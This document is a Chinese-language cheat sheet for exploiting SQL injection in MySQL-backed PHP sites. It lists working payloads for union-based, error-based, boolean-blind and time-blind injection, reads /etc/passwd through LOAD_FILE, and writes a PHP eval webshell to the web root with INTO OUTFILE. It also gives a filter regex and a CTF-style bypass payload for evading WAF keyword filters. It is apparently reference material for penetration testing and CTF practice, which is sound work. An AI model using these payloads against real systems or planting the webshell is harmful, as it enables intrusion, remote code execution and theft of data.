# EXP手册-SQL injection(MySQL) 

php:  
## SQL语句基础知识
### 0x01查询语句
#### 1.查询数据库名
```
SELECT database();    
SELECT schema_name FROM information_schema.schemata;   
SELECT DISTINCT(db) FROM mysql.db;-- (Privileged)    
``` 
#### 2.查询表名
```
SELECT table_name FROM information_schema.tables WHERE  table_schema=database() 
```  
#### 3.查询列名   
tablename为表名
```
SELECT column_name FROM information_schema.columns WHERE table_name = 'tablename'   
```    
### 0x02文件读写
前置条件：file权限
   
#### 1.查询权限
判断方法：
`SELECT @@secure_file_priv`   
- Mysql>=5.5.53 默认为NULL，即默认禁止导入导出
- Mysql<5.5.53 默认为空，即默认无限制
或者查询用户权限：     
>username为用户名
```
SELECT file_priv FROM mysql.user WHERE user = 'username';//需要root权限    
SELECT grantee, is_grantable FROM information_schema.user_privileges WHERE privilege_type = 'file' AND grantee like '%username%';     
```
#### 2.读文件   
```
SELECT LOAD_FILE('/etc/passwd');
```
- LOAD_FILE()函数操作文件的当前目录是@@datadir 
- MySQL用户必须拥有对此文件读取的权限
- 文件大小必须小于 max_allowed_packet。
- @@max_allowed_packet的默认大小是1047552 字节


#### 3.写文件
INTO OUTFILE/DUMPFILE
```
SELECT '<? @eval($_POST[\'c\']); ?>' INTO OUTFILE '/var/www/shell.php';
```
*注入拼接写文件payload——sqlmap写文件为空解决方法*：    
sqlmap写文件为空原因在于查询结果为空所以结尾也没有添加自定义字符     
因此，1.构造正确查询有结果;2.拼接查询结果
```
//输入参数如下，前面查询的语句省略，这是where后的语句
//后面是字段拼接字符和行拼接字符
admin' or 'a'='a' LIMIT 0,1 INTO OUTFILE '/var/www/html/re.php' FIELDS TERMINATED BY '-'  LINES TERMINATED BY '<?phpinfo();?>';
```

其它写webshell方法:[Mysql写入Webshell](https://www.cnblogs.com/xuyangda/p/14510562.html)
### 0x03常用常量和函数
当前用户：     
`user()`
查询可写安全目录：      
`@@global.secure_file_priv`  
查询版本:    
`VERSION()`    
`@@VERSION`     
`@@GLOBAL.VERSION`     
服务器主机名：    
`@@HOSTNAME`      
## SQL注入漏洞利用
SQL注入利用类型主要分类：
- Union型注入
- 报错型注入
- Bool型盲注
- 时间型盲注
### 0x04 Union注入
#### 1.判断字段数
ORDER BY判断字段数。     
ORDER BY n+1; 让n一直增加直到出现错误页面。  
#### 2.寻找输出位
#### 3.构造EXP
Eg.  
``` 
 查询语句 SELECT username, password, permission FROM Users WHERE id = '1'; 
 1' ORDER BY 1--+ True 
 1' ORDER BY 2--+ True 
 1' ORDER BY 3--+ True 
 1' ORDER BY 4--+ False 
说明查询只用了3个字段。    
-1' UNION SELECT 1,2,3--+ True //在页面找到输出的字段值     
-1' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database();
```
### 0x05 报错型注入
报错关键词有： floor、extractvalue、updatexml、geometrycollection、multipoint、polygon、multipolygon、linestring、multilinestring、ST_LatFromGeoHash、ST_LongFromGeoHash、GTID_SUBSET、GTID_SUBTRACT、ST_PointFromGeoHash
#### 1. floor方式
```
select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a;
```
释义:
>rand() 随机数函数 产生0-1的随机数
count(_) 计数
floor() 向下取整函数，舍去小数点，比如：floor(1.3)=1
floor(rand()_2) 结果只有0和1
group by name 按name的首位字典顺序排列
concat() 连接括号里面的内容
此处有三个点，一是需要count计数，二是floor，取得0 or 1，进行数据的重复，三是group by进行分组，但具体原理解释不是很通，大致原理为分组后数据计数时重复造成的错误。也有解释为mysql 的bug 的问题。但是此处需要将rand(0)，rand()需要多试几次才行。
#### 2. xpath函数
xpath处理函数:
__extractvalue__
__updatexml__
从mysql5.1.5开始提供两个XML查询和修改的函数，其中extractvalue负责在xml文档中按照xpath语法查询节点内容，updatexml则负责修改查询到的内容   
```
mysql> select * from mysql.user where user = 'root' and extractvalue(1,concat(0x5c,user()));
ERROR 1105 (HY000): XPATH syntax error: '\root@localhost'
mysql> select * from mysql.user where user = 'root' and updatexml(1,concat(0x5c,user()),1);
ERROR 1105 (HY000): XPATH syntax error: '\root@localhost'
```
如果concat被过滤了，可以使用其他函数代替   
MAKE_SET(bits,str1,str2,…)
```
mysql> select * from mysql.user where user = 'root' and extractvalue(1,make_set(3,'~',version()));
ERROR 1105 (HY000): XPATH syntax error: '~,5.5.40-log'
```
lpad()
```
mysql> SELECT LPAD('hi',4,'??'); -> '??hi'
mysql> select * from mysql.user where user = 'root' and extractvalue(1,lpad((version()),20,'@'));
ERROR 1105 (HY000): XPATH syntax error: '@@@@@@@@@5.5.40-log'
```
#### 3.几何函数
几何函数有：geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring()
一些函数在Mysql 5.0.中存在但是不会报错,5.1后才可以报错   
>geometrycollection()
multipoint()
polygon()
multipolygon()
linestring()
multilinestring()
exp()

```
mysql> select multipoint((select * from (select * from (select * from (select version())a)b)c));
ERROR 1367 (22007): Illegal non geometric '(select `c`.`version()` from (select '5.5.40-log' AS `version()` from dual) `c`)' va
//exp
select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));
```
#### 4.值类型超出范围
在MySQL版本大于等于5.5.5的的时候才能用
double型函数exp()超出范围
这个函数是以e为底的对数函数
```
select exp(~(select*from(select user())x))
```
#### 5.数据重复
这里的version()出现了2次，所以报错。
比较鸡肋无法构造语句。    
```
select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x
```
#### 6.补充
在MySQL5.7中多了很多能报错的函数   
>ST_LatFromGeoHash()
ST_LongFromGeoHash()
GTID_SUBSET()
GTID_SUBTRACT()
ST_PointFromGeoHash()
```
mysql> select ST_LatFromGeoHash(version());
ERROR 1411 (HY000): Incorrect geohash value: '5.7.12-log' for function ST_LATFROMGEOHASH
mysql> select ST_LongFromGeoHash(version());
ERROR 1411 (HY000): Incorrect geohash value: '5.7.12-log' for function ST_LONGFROMGEOHASH
mysql> select GTID_SUBSET(version(),1);
ERROR 1772 (HY000): Malformed GTID set specification '5.7.12-log'.
mysql> select GTID_SUBTRACT(version(),1);
ERROR 1772 (HY000): Malformed GTID set specification '5.7.12-log'.
mysql> select ST_PointFromGeoHash(version(),1);
ERROR 1411 (HY000): Incorrect geohash value: '5.7.12-log' for function st_pointfromgeohash
```
### 0x06 Bool型盲注
盲注推荐阅读：[一文搞定MySQL盲注](https://www.anquanke.com/post/id/266244)     
判断：   
`and 1=1`   
`and 1=2`   
读数据：    
`AND ascii(SELECT SUBSTR(table_name,1,1) FROM information_schema.tables) =ascii('A')`
### 0x07 时间型盲注
判断：     
`and sleep(5)`
读数据：    
```
//条件判断型：if((condition), sleep(5), 0);
//条件判断型：CASE WHEN (condition) THEN sleep(5) ELSE 0 END;
//无条件判断型：sleep(5*(condition))
and if((select ord(substring(database(),1,1))) = 97,sleep(5),1)
```
## 常用小技巧
### 1.多行合并一行   

#### concat()函数   
多个字符串连接成一个字符串。   
0x7e ~
```
//这里限制limit返回一行一个字段，如果不限制，还是返回多行
select concat(id,0x7e,name) as c from a limit 1;
```
#### concat_ws()
concat_ws() 代表 CONCAT With Separator ，是concat()的特殊形式。第一个参数是其它参数的分隔符。   
```
select concat('_',id,name) as c from a limit 1;
```

#### group_concat()函数
连接一个组的所有字符串，并以逗号分隔每一条数据   
```
//多行结果拼接一行
select group_concat(name) as name from a ;   
```

### 2. 截取字符串
left(),right(),substring(),substring_index()   
如果显示有字数限制，对于过长的字符串需要分部分截取。
从左边开始截取   
```
SELECT LEFT('web-exp-mysql',6)
```
从右边开始截取   
```
SELECT RIGHT('web-exp-mysql',6)
```
从第3个字符开始截取到结束   
```
SELECT SUBSTRING('web-exp-mysql', 3)
```
截取第二个“-”之前的所有字符    
```
SELECT SUBSTRING_INDEX('web-exp-mysql', '-', 2);
```
截取倒数第二个“-”之后的所有字符   
```
SELECT SUBSTRING_INDEX('web-exp-mysql', '.', -2);
```
## Bypass
### 1.bypass WAF
- [sql-injection-fuck-waf](https://notwhy.github.io/2018/06/sql-injection-fuck-waf/)
### 2.bypass 过滤函数
过滤:
```
gtid_subset|updatexml|extractvalue|floor|rand|exp|json_keys|uuid_to_bin|bin_to_uuid|union|like|hash|sleep|benchmark| |;|\*|\+|-|/|<|>|~|!|\d|%|\x09|\x0a|\x0b|\x0c|\x0d|`
```
绕过
```
'and(ASCII(substring((select(group_concat(table_name))from(information_schema.TABLES)where(TABLE_SCHEMA='rctf')),(ord('b')MOD(ord('a'))),(ord('b')MOD(ord('a')))))=ASCII('f')'and(ASCII(substring((select(group_concat(table_name))from(information_schema.TABLES)where(TABLE_SCHEMA='rctf')),(ord('b')MOD(ord('a'))),(ord('b')MOD(ord('a')))))=ASCII('f')
```
### 3.bypass Token保护
- [Burpsuite+SQLMAP双璧合一绕过Token保护的应用进行注入攻击](https://www.freebuf.com/sectool/128589.html)

## Ref
- https://www.cnblogs.com/xuyangda/p/14510562.html
- https://www.anquanke.com/post/id/266244
- https://www.freebuf.com/sectool/128589.html
  
